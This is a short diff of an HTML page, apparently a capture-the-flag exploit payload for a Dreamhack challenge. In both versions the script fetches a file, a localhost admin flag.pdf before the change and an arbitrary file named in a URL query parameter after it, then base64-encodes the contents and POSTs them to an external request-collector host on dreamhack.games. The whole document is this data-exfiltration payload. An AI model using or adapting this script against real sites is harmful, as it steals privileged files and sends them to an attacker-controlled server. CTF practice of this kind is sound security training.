@@ -2,17 +2,15 @@
 <html>
 <body>
 <script>
-fetch("http://localhost:1337/app/admin/flag.pdf")
+fetch(new URLSearchParams(location.search).get("file"))
   .then(r => r.text())
-  .then(flag => {
-    const b64 = btoa(flag);
-    fetch("https://sijovsz.request.dreamhack.games/", {
+  .then(data => {
+    const b64 = btoa(data);
+    fetch("https://uheyzgr.request.dreamhack.games", {
       method: "POST",
-      body: b64,
-      headers: { "Content-Type": "text/plain" }
+      body: b64
     });
   });
 </script>
-
 </body>
 </html>
